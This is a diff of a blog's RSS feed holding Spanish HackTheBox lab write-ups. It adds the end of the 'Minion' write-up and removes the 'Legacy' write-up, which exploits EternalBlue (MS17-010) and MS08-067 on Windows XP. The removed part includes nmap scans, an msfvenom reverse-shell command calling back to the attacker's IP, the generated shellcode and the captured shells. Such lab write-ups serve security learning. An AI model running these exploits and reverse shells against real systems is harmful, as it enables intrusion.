+PSComputerName          : localhost
+RunspaceId              : 3cd818dd-a33a-4cf9-85a5-069c0144cf18
+Caption                 : 
+Description             : 
+ElementName             : fmiracle
+InstanceID              : {fe96175f-38d1-451f-ad74-95e144f0d702}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Si ahora tratamos de ver los puertos abiertos de la maquina.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.57
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 12:50 -05
+Initiating SYN Stealth Scan at 12:50
+Scanning 10.10.10.57 [65535 ports]
+Discovered open port 445/tcp on 10.10.10.57
+Discovered open port 135/tcp on 10.10.10.57
+Discovered open port 139/tcp on 10.10.10.57
+Discovered open port 80/tcp on 10.10.10.57
+Discovered open port 3389/tcp on 10.10.10.57
+Discovered open port 49153/tcp on 10.10.10.57
+Discovered open port 49154/tcp on 10.10.10.57
+Discovered open port 49157/tcp on 10.10.10.57
+Discovered open port 62696/tcp on 10.10.10.57
+Discovered open port 49152/tcp on 10.10.10.57
+Discovered open port 49156/tcp on 10.10.10.57
+Discovered open port 49155/tcp on 10.10.10.57
+Discovered open port 5985/tcp on 10.10.10.57
+Discovered open port 47001/tcp on 10.10.10.57
+Completed SYN Stealth Scan at 12:51, 27.30s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.57
+Host is up, received user-set (0.21s latency).
+Scanned at 2023-10-16 12:50:43 -05 for 28s
+Not shown: 65521 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       REASON
+80/tcp    open  http          syn-ack ttl 127
+135/tcp   open  msrpc         syn-ack ttl 127
+139/tcp   open  netbios-ssn   syn-ack ttl 127
+445/tcp   open  microsoft-ds  syn-ack ttl 127
+3389/tcp  open  ms-wbt-server syn-ack ttl 127
+5985/tcp  open  wsman         syn-ack ttl 127
+47001/tcp open  winrm         syn-ack ttl 127
+49152/tcp open  unknown       syn-ack ttl 127
+49153/tcp open  unknown       syn-ack ttl 127
+49154/tcp open  unknown       syn-ack ttl 127
+49155/tcp open  unknown       syn-ack ttl 127
+49156/tcp open  unknown       syn-ack ttl 127
+49157/tcp open  unknown       syn-ack ttl 127
+62696/tcp open  unknown       syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 27.38 seconds
+           Raw packets sent: 131072 (5.767MB) | Rcvd: 40 (1.600KB)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Podriamos tratar de conectarnos por a traves del puerto 3389 por &lt;code&gt;RDP&lt;/code&gt;, ejecutar el &lt;code&gt;root.txt&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Minion/mini14.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 17 Oct 2023 00:00:00 -0500</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Minion</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Minion</guid>
+        
+        <category>Server Site Request Forgery - SSRF</category>
+        
+        <category>ICMP Reverse Shell</category>
+        
+        <category>Firewall Bypassing</category>
+        
+        <category>Weak Permissions</category>
+        
+        <category>Information Disclosure</category>
+        
+        <category>Alternative Data Streams - ADS</category>
+        
+        <category>Firewall Rule Manipulation</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
     
       <item>
         <title>Maquina Monteverde - htb writeup</title>
@@ -5615,448 +6134,6 @@ root
         <category>Abussing httpd Parameter</category>
         
         <category>Cracking Hashes</category>
-        
-        
-        <category>hackthebox</category>
-        
-      </item>
-    
-      <item>
-        <title>Maquina Legacy - htb writeup</title>
-        <description>&lt;p&gt;El dia de hoy vamos a resolver &lt;code&gt;Legacy&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina &lt;code&gt;windows&lt;/code&gt; sencilla de dificultad facil, en la explotación vamos a repasar los conceptos para realizar una explotación manual de &lt;code&gt;eternal blue&lt;/code&gt; usando el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, ademas de forma alternativa para explotar la maquina realizaremos una enumeración por &lt;code&gt;smb&lt;/code&gt; donde se nos reprotara que el servicio es vulnerable a el exploit &lt;code&gt;MS08_067&lt;/code&gt; el cual tambien explotaremos a traves de la creación de un &lt;code&gt;shellcode&lt;/code&gt; para asi obtener acceso como el usuario &lt;code&gt;adminsitrator&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Comenzaremos como de costumbre creando un directorio con el nombre de la maquina:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Legacy
-❯ ls
- Legacy
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
-mkt () {
-	mkdir {nmap,content,exploits,scripts}
-}
-❯ mkt
-❯ ls
- content   exploits   nmap   scripts
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;enumeracion&quot;&gt;ENUMERACION &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.4
-PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
-64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=119 ms
-
---- 10.10.10.4 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 118.571/118.571/118.571/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Parámetro&lt;/th&gt;
-      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
-      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG openPorts
-Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:54 GMT
-Initiating SYN Stealth Scan at 18:54
-Scanning 10.10.10.4 [65535 ports]
-Discovered open port 139/tcp on 10.10.10.4
-Discovered open port 445/tcp on 10.10.10.4
-Discovered open port 135/tcp on 10.10.10.4
-Completed SYN Stealth Scan at 18:55, 21.64s elapsed (65535 total ports)
-Nmap scan report for 10.10.10.4
-Host is up, received user-set (0.18s latency).
-Scanned at 2023-06-29 18:54:52 GMT for 21s
-Not shown: 56233 closed tcp ports (reset), 9299 filtered tcp ports (no-response)
-Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
-PORT    STATE SERVICE      REASON
-135/tcp open  msrpc        syn-ack ttl 127
-139/tcp open  netbios-ssn  syn-ack ttl 127
-445/tcp open  microsoft-ds syn-ack ttl 127
-
-Read data files from: /usr/bin/../share/nmap
-Nmap done: 1 IP address (1 host up) scanned in 21.77 seconds
-           Raw packets sent: 106649 (4.693MB) | Rcvd: 65813 (2.633MB)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS&lt;/h3&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445 10.10.10.4 -oN targeted
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 18:56 GMT
-Nmap scan report for 10.10.10.4
-Host is up (0.18s latency).
-
-PORT    STATE SERVICE      VERSION
-135/tcp open  msrpc        Microsoft Windows RPC
-139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp open  microsoft-ds Windows XP microsoft-ds
-Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
-
-Host script results:
-|_smb2-time: Protocol negotiation failed (SMB2)
-|_clock-skew: mean: 5d00h27m34s, deviation: 2h07m16s, median: 4d22h57m34s
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled (dangerous, but default)
-|_nbstat: NetBIOS name: LEGACY, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: 00:50:56:b9:a9:4a (VMware)
-| smb-os-discovery: 
-|   OS: Windows XP (Windows 2000 LAN Manager)
-|   OS CPE: cpe:/o:microsoft:windows_xp::-
-|   Computer name: legacy
-|   NetBIOS computer name: LEGACY\x00
-|   Workgroup: HTB\x00
-|_  System time: 2023-07-04T23:53:50+03:00
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 19.17 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows XP&lt;/code&gt;:&lt;/p&gt;
-
-&lt;table&gt;
-  &lt;thead&gt;
-    &lt;tr&gt;
-      &lt;th&gt;Puerto&lt;/th&gt;
-      &lt;th&gt;Servicio&lt;/th&gt;
-      &lt;th&gt;Versión&lt;/th&gt;
-    &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-    &lt;tr&gt;
-      &lt;td&gt;135&lt;/td&gt;
-      &lt;td&gt;RPC&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;139&lt;/td&gt;
-      &lt;td&gt;LDAP&lt;/td&gt;
-      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
-    &lt;/tr&gt;
-    &lt;tr&gt;
-      &lt;td&gt;445&lt;/td&gt;
-      &lt;td&gt;SMB&lt;/td&gt;
-      &lt;td&gt;Windows XP microsoft-ds&lt;/td&gt;
-    &lt;/tr&gt;
-  &lt;/tbody&gt;
-&lt;/table&gt;
-
-&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Como vemos que la maquina corresponde &lt;code&gt;Windows XP&lt;/code&gt;, podemos explotar el &lt;code&gt;eternal blue&lt;/code&gt;, asi que vamos a explotarlo usando el exploit de github de warawit.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;https://github.com/worawit/MS17-010&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Descargamos al repositorio y ejecutamos el &lt;code&gt;checker.py&lt;/code&gt;, para encontrar &lt;code&gt;named pipes&lt;/code&gt; vulnerables.&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;Ejectamos el &lt;code&gt;checker.py&lt;/code&gt; el cual nos reporta dos &lt;code&gt;named pipes&lt;/code&gt; de los que podemos abusar.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.4
-Target OS: Windows 5.1
-The target is not patched
-
-=== Testing named pipes ===
-spoolss: Ok (32 bit)
-samr: STATUS_ACCESS_DENIED
-netlogon: STATUS_ACCESS_DENIED
-lsarpc: STATUS_ACCESS_DENIED
-browser: Ok (32 bit)
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora nos abriremos el &lt;code&gt;zzz_exploit.py&lt;/code&gt;, para modificar la instrucción que queremos ejecutar al lanzar el exploit, en la que nos montaremos un recurso compartido en nuestra maquina donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt; el cual se ejecutara otorgandonos una conexión a nuestra maquina. Esto descomentado la opción &lt;code&gt;service_exec&lt;/code&gt; y comentaremos las lineas previas.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para ello, podemos descarganos el ejecutable de &lt;code&gt;nc&lt;/code&gt;, para ello iremos al siguiente enlace y descargaremos el correspondiente a la versión &lt;code&gt;1.12&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Si optamos por descargarlo de esta manera obtendremos un comprimido, el cual debemos descomprimirlo en una carpeta aparte ya que este contiene muchos archivos.&lt;/p&gt;
-
-&lt;p&gt;En mi caso yo usare el &lt;code&gt;nc.exe&lt;/code&gt; que contempla el repositorio de &lt;code&gt;danil miesler&lt;/code&gt;.&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;https://github.com/danielmiessler/SecLists&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cp /opt/SecLists/Miscellaneous/web/http-request-headers/nc.exe .
-❯ ls
- MS17-010   nc.exe   netcat-win32-1.12.zip
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Procedemos a montar nuestro recurso compartido, donde alojaremos el &lt;code&gt;nc.exe&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
-Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
-
-[*] Config file parsed
-[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
-[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
-[*] Config file parsed
-[*] Config file parsed
-[*] Config file parsed
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nos ponemos en escucha con &lt;code&gt;ncat&lt;/code&gt; por el puerto que configuramos, en este caso el correspondiente a el &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ejecutamos el &lt;code&gt;zzz_exploit.py&lt;/code&gt; junto con el named pipe que previamente nos reporto el &lt;code&gt;checker.py&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py 10.10.10.4 spoolss
-Target OS: Windows 5.1
-Groom packets
-attempt controlling next transaction on x86
-success controlling one transaction
-modify parameter count to 0xffffffff to be able to write backward
-leak next transaction
-CONNECTION: 0x86101b30
-SESSION: 0xe1b1cc68
-FLINK: 0x7bd48
-InData: 0x7ae28
-MID: 0xa
-TRANS1: 0x78b50
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;y recibimos la conexión.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.4.
-Ncat: Connection from 10.10.10.4:1046.
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
-
-C:\WINDOWS\system32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ahora podemos ir al directorio del usuario john y visualizar la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Documents and Settings\john\Desktop&amp;gt;dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 54BF-723B
-
- Directory of C:\Documents and Settings\john\Desktop
-
-16/03/2017  09:19     &amp;lt;DIR&amp;gt;          .
-16/03/2017  09:19     &amp;lt;DIR&amp;gt;          ..
-16/03/2017  09:19                 32 user.txt
-               1 File(s)             32 bytes
-               2 Dir(s)   6.342.070.272 bytes free
-
-C:\Documents and Settings\john\Desktop&amp;gt;type user.txt
-type user.txt
-e69af0e4f443de7e36876fda4ec7644f
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&quot;explotacion-alterna&quot;&gt;EXPLOTACION ALTERNA &lt;a href=&quot;#explotacion-alterna&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;
-
-&lt;p&gt;Ahora para comprometer la maquina de una manera alternativa, primero usaremos los scripts &lt;code&gt;smb-vuln\*&lt;/code&gt; de nmap en el puerto &lt;code&gt;445&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;QUITTING!
-❯ nmap --script smb-vuln\* -p445 10.10.10.4 -oN smbScan
-Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-29 19:55 GMT
-Nmap scan report for 10.10.10.4
-Host is up (0.12s latency).
-
-PORT    STATE SERVICE
-445/tcp open  microsoft-ds
-
-Host script results:
-|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
-|_smb-vuln-ms10-054: false
-| smb-vuln-ms08-067: 
-|   VULNERABLE:
-|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
-|     State: VULNERABLE
-|     IDs:  CVE:CVE-2008-4250
-|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
-|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
-|           code via a crafted RPC request that triggers the overflow during path canonicalization.
-|           
-|     Disclosure date: 2008-10-23
-|     References:
-|       https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
-|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
-
-Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Nmap nos reporta que el servicio es vulnerable a &lt;code&gt;ms08-067&lt;/code&gt; ya que corresponde a un &lt;code&gt;Windows XP&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para poder explotarla vamos a descargarnos un exploit de &lt;code&gt;andyacer&lt;/code&gt; de github:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/andyacer/ms08_067&quot;&gt;https://github.com/andyacer/ms08_067&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Ahi nos explican a fondo en que consiste la explotación y nos pide que generemos un &lt;code&gt;shellcode&lt;/code&gt; el cual debemos ingresar al &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;Para ello vamos a generar el shellcode usando &lt;code&gt;msfvenom&lt;/code&gt;, si no sabes como en el repositorio te explica como debemos hacerlo exactamente, solo debemos especificar nuestra ip y el puerto.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.3 LPORT=443 EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
-Found 11 compatible encoders
-Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
-x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
-Attempting to encode payload with 1 iterations of generic/none
-generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
-Attempting to encode payload with 1 iterations of x86/call4_dword_xor
-x86/call4_dword_xor succeeded with size 348 (iteration=0)
-x86/call4_dword_xor chosen with final size 348
-Payload size: 348 bytes
-Final size of c file: 1491 bytes
-unsigned char buf[] = 
-&quot;\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76&quot;
-&quot;\x0e\x63\xc8\xc3\x99\x83\xee\xfc\xe2\xf4\x9f\x20\x41\x99&quot;
-&quot;\x63\xc8\xa3\x10\x86\xf9\x03\xfd\xe8\x98\xf3\x12\x31\xc4&quot;
-&quot;\x48\xcb\x77\x43\xb1\xb1\x6c\x7f\x89\xbf\x52\x37\x6f\xa5&quot;
-&quot;\x02\xb4\xc1\xb5\x43\x09\x0c\x94\x62\x0f\x21\x6b\x31\x9f&quot;
-&quot;\x48\xcb\x73\x43\x89\xa5\xe8\x84\xd2\xe1\x80\x80\xc2\x48&quot;
-&quot;\x32\x43\x9a\xb9\x62\x1b\x48\xd0\x7b\x2b\xf9\xd0\xe8\xfc&quot;
-&quot;\x48\x98\xb5\xf9\x3c\x35\xa2\x07\xce\x98\xa4\xf0\x23\xec&quot;
-&quot;\x95\xcb\xbe\x61\x58\xb5\xe7\xec\x87\x90\x48\xc1\x47\xc9&quot;
-&quot;\x10\xff\xe8\xc4\x88\x12\x3b\xd4\xc2\x4a\xe8\xcc\x48\x98&quot;
-&quot;\xb3\x41\x87\xbd\x47\x93\x98\xf8\x3a\x92\x92\x66\x83\x97&quot;
-&quot;\x9c\xc3\xe8\xda\x28\x14\x3e\xa0\xf0\xab\x63\xc8\xab\xee&quot;
-&quot;\x10\xfa\x9c\xcd\x0b\x84\xb4\xbf\x64\x37\x16\x21\xf3\xc9&quot;
-&quot;\xc3\x99\x4a\x0c\x97\xc9\x0b\xe1\x43\xf2\x63\x37\x16\xc9&quot;
-&quot;\x33\x98\x93\xd9\x33\x88\x93\xf1\x89\xc7\x1c\x79\x9c\x1d&quot;
-&quot;\x54\xf3\x66\xa0\xc9\x93\x73\xcb\xab\x9b\x63\xc9\x78\x10&quot;
-&quot;\x85\xa2\xd3\xcf\x34\xa0\x5a\x3c\x17\xa9\x3c\x4c\xe6\x08&quot;
-&quot;\xb7\x95\x9c\x86\xcb\xec\x8f\xa0\x33\x2c\xc1\x9e\x3c\x4c&quot;
-&quot;\x0b\xab\xae\xfd\x63\x41\x20\xce\x34\x9f\xf2\x6f\x09\xda&quot;
-&quot;\x9a\xcf\x81\x35\xa5\x5e\x27\xec\xff\x98\x62\x45\x87\xbd&quot;
-&quot;\x73\x0e\xc3\xdd\x37\x98\x95\xcf\x35\x8e\x95\xd7\x35\x9e&quot;
-&quot;\x90\xcf\x0b\xb1\x0f\xa6\xe5\x37\x16\x10\x83\x86\x95\xdf&quot;
-&quot;\x9c\xf8\xab\x91\xe4\xd5\xa3\x66\xb6\x73\x23\x84\x49\xc2&quot;
-&quot;\xab\x3f\xf6\x75\x5e\x66\xb6\xf4\xc5\xe5\x69\x48\x38\x79&quot;
-&quot;\x16\xcd\x78\xde\x70\xba\xac\xf3\x63\x9b\x3c\x4c&quot;;
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Ese shellcode generado, ahora vamos a introducirlo en el &lt;code&gt;exploit&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Legacy/lega3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ejecutamos el exploit sin antes ponernos en escucha con &lt;code&gt;ncat&lt;/code&gt; en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 ms08_067_2018.py 10.10.10.4 6 445
-#######################################################################
-#   MS08-067 Exploit
-#   This is a modified verion of Debasis Mohanty's code (https://www.exploit-db.com/exploits/7132/).
-#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi
-#
-#   Mod in 2018 by Andy Acer:
-#   - Added support for selecting a target port at the command line.
-#     It seemed that only 445 was previously supported.
-#   - Changed library calls to correctly establish a NetBIOS session for SMB transport
-#   - Changed shellcode handling to allow for variable length shellcode. Just cut and paste
-#     into this source file.
-#######################################################################
-
-Windows XP SP3 English (NX)
-
-[-]Initiating connection
-[-]connected to ncacn_np:10.10.10.4[\pipe\browser]
-Exploit finish
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Recibimos la conexión, ahora podemos ir al directorio del usuario &lt;code&gt;Administrator&lt;/code&gt; y leer la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
-Ncat: Version 7.92 ( https://nmap.org/ncat )
-Ncat: Listening on :::443
-Ncat: Listening on 0.0.0.0:443
-Ncat: Connection from 10.10.10.4.
-Ncat: Connection from 10.10.10.4:1047.
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
-
-C:\WINDOWS\system32&amp;gt; cd &quot;Documents and Settings&quot;
-cd &quot;Documents and Settings&quot;
-
-C:\Documents and Settings&amp;gt;dir
-dir
- Volume in drive C has no label.
- Volume Serial Number is 54BF-723B
-
- Directory of C:\Documents and Settings
-
-16/03/2017  09:07     &amp;lt;DIR&amp;gt;          .
-16/03/2017  09:07     &amp;lt;DIR&amp;gt;          ..
-16/03/2017  09:07     &amp;lt;DIR&amp;gt;          Administrator
-16/03/2017  08:29     &amp;lt;DIR&amp;gt;          All Users
-16/03/2017  08:33     &amp;lt;DIR&amp;gt;          john
-               0 File(s)              0 bytes
-               5 Dir(s)   6.403.846.144 bytes free
-
-C:\Documents and Settings&amp;gt;cd Administrator\Desktop
-cd Administrator\Desktop
-
-C:\Documents and Settings\Administrator\Desktop&amp;gt;type root.txt
-type root.txt
-993442d258b0e0ec917cae9e695d5713
-C:\Documents and Settings\Administrator\Desktop&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-
-</description>
-        <pubDate>Thu, 29 Jun 2023 00:00:00 -0500</pubDate>
-        <link>http://localhost:4000/hackthebox/htb-writeup-Legacy</link>
-        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Legacy</guid>
-        
-        <category>SMB Enumeration</category>
-        
-        <category>Eternal Blue explotation</category>
-        
-        <category>(MS17-010)</category>
-        
-        <category>(MS08-067)</category>
         
         
         <category>hackthebox</category>
